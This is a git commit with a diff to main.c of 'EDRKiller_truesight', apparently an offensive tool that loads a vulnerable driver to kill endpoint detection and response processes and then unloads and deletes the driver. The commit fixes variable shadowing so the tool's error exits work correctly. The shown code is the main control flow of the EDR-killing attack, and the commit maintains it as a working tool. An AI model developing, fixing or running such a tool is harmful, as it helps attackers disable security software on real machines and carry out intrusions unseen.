7bc73edaa32cc3762f7d35f8d805c815a155a169
Shadow-King-Cyber <jaime1900varela@gmail.com>
2026-07-12 14:35:00 -0500

    fix: corregir variable shadowing en main.c (bSTATE) en las 3 variantes - cleanup ahora retorna EXIT_FAILURE correctamente

--- truesight/EDRKiller_truesight/main.c
+++ truesight/EDRKiller_truesight/main.c
@@ -22,7 +22,7 @@ int main() {
 	infoW(L"LoadDriver - Loading vulnerable driver from \"%ls\" with name \"%ls\"", szVulnDriverPath, g_VULNDRIVERNAME);
 	if (!LoadDriver(g_VULNDRIVERNAME, szVulnDriverPath)) {
 		error("LoadDriver - Failed to load driver");
-		BOOL bSTATE = FALSE;
+		bSTATE = FALSE;
 		goto _cleanUp;
 	}
 	okayW(L"LoadDriver - Loaded vulnerable driver, servicename: \"%ls\"", g_VULNDRIVERNAME);
@@ -32,7 +32,7 @@ int main() {
 	infoW(L"KillEdrProcesses - Looping over the EDR processes and killing them");
 	if (!KillEdrProcesses()) {
 		error("KillEdrProcesses - Failed");
-		BOOL bSTATE = FALSE;
+		bSTATE = FALSE;
 		goto _cleanUp;
 	}
 	okayW(L"KillEdrProcesses - Completed");
@@ -46,7 +46,7 @@ _cleanUp:
 	infoW(L"UnloadDriver - Unloading vulnerable driver \"%ls\"", g_VULNDRIVERNAME);
 	if (!UnloadDriver(g_VULNDRIVERNAME)) {
 		error("UnloadDriver - Failed to unload driver");
-		BOOL bSTATE = FALSE;
+		bSTATE = FALSE;
 	}
 	okayW(L"UnloadDriver - Unloaded vulnerable driver \"%ls\"", g_VULNDRIVERNAME);
 	printf("\n");
@@ -55,7 +55,7 @@ _cleanUp:
 	infoW(L"RemoveFileW - Vulnerable driver \"%ls\"", szVulnDriverPath);
 	if (!RemoveFileW(szVulnDriverPath)) {
 		error("RemoveFileW - Failed to delete file");
-		BOOL bSTATE = FALSE;
+		bSTATE = FALSE;
 	}
 	okayW(L"RemoveFileW - Deleted vulnerable driver \"%ls\"", szVulnDriverPath);
 	printf("\n");
